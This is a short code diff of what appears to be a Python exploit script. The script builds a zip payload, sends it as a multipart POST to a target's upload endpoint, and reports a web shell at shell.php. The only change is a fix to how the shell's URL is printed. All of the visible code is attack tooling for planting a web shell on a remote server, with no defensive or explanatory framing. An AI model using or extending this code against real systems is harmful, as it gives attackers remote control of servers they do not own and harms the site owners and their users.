@@ -27,8 +27,9 @@ def upload_zip():
         payload += f.read().decode('latin1')
     payload += f"\r\n--{boundary}--\r\n"
     r = requests.post(url=upload_url, headers=header, data=payload, proxies=http_proxy)
+    host, port = target.split(":")
     if 'File Uploaded Successfully' in r.text:
-        print(f"[+] Shell success uploaded\nYou can access here http://{target}/shell.php")
+        print(f"[+] Shell success uploaded\nYou can access here http://{host}/shell.php")
 
 build_zip()
 upload_zip()
